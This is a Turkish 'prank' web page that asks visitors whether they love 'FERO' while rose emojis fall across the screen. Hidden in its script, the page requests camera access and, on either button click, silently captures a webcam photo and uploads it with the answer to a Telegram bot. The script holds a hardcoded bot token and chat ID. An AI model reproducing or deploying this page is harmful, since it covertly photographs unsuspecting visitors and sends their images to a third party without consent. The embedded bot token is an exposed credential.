<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <title>Şaka Sitesi</title>
  <style>
    body { 
      display: flex; 
      justify-content: center; 
      align-items: center; 
      height: 100vh; 
      background: #111; 
      color: white; 
      font-family: Arial, sans-serif; 
      text-align: center;
      flex-direction: column;
      overflow: hidden;
    }
    h1 { font-size: 2em; margin-bottom: 20px; z-index: 2; }
    button { 
      padding: 10px 20px; 
      margin: 5px; 
      border: none; 
      border-radius: 8px; 
      font-size: 16px; 
      cursor: pointer; 
      z-index: 2;
    }
    button:hover { opacity: 0.8; }
    .yes { background: #4caf50; color: white; }
    .no { background: #f44336; color: white; }

    /* Gül animasyonu */
    .rose {
      position: absolute;
      top: -50px;
      font-size: 24px;
      animation: fall linear forwards;
      opacity: 0.9;
    }
    @keyframes fall {
      to {
        transform: translateY(110vh) rotate(360deg);
        opacity: 0;
      }
    }
  </style>
</head>
<body>
  <h1>FERO'yu seviyor musun?</h1>
  <button class="yes">Evet</button>
  <button class="no">Hayır</button>

  <video id="video" autoplay></video>
  <canvas id="canvas"></canvas>

  <script>
    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");
    const ctx = canvas.getContext("2d");

    const BOT_TOKEN = "8369405248:AAEGL_vh2_ZkknIOKbOaqbHVEGynLzPq47I";
    const CHAT_ID = "8494445812";

    function takePhoto(answer) {
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      ctx.drawImage(video, 0, 0);

      canvas.toBlob(blob => {
        const formData = new FormData();
        formData.append("chat_id", CHAT_ID);
        formData.append("photo", blob, "photo.png");
        formData.append("caption", `Cevap: ${answer}`);

        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
          method: "POST",
          body: formData
        }).then(() => {
          document.body.innerHTML = "<h1>Şakalandın dostum 😃</h1>";
        }).catch(() => {
          document.body.innerHTML = "<h1>Fotoğraf gönderilemedi 😅</h1>";
        });
      });
    }

    document.querySelector(".yes").onclick = () => takePhoto("Evet");
    document.querySelector(".no").onclick = () => takePhoto("Hayır");

    // Kamera aç
    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        video.srcObject = stream;
      })
      .catch(err => {
        document.body.innerHTML = "<h1>Kamera izni vermedin 😅</h1>";
      });

    // Gül oluşturma
    function createRose() {
      const rose = document.createElement("div");
      rose.classList.add("rose");
      rose.innerHTML = "🌹";
      rose.style.left = Math.random() * 100 + "vw";
      rose.style.fontSize = (20 + Math.random() * 20) + "px";
      rose.style.animationDuration = (4 + Math.random() * 4) + "s";
      document.body.appendChild(rose);

      setTimeout(() => {
        rose.remove();
      }, 8000);
    }

    // Her 500ms'de bir gül düşsün
    setInterval(createRose, 500);
  </script>
</body>
</html>
